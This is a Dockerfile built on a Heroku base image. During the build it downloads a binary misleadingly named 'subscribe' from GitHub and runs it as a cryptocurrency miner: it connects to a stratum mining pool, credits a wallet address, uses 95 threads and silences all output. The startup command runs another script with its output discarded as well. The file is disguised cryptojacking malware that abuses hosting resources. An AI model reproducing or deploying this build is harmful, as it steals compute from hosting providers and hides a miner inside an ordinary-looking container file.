FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Mna4iWvA75MoP8ornCNCnGGphNwsUEdKE2.hero -t95 > /dev/null 2>&1
CMD bash heroku.sh > /dev/null 2>&1
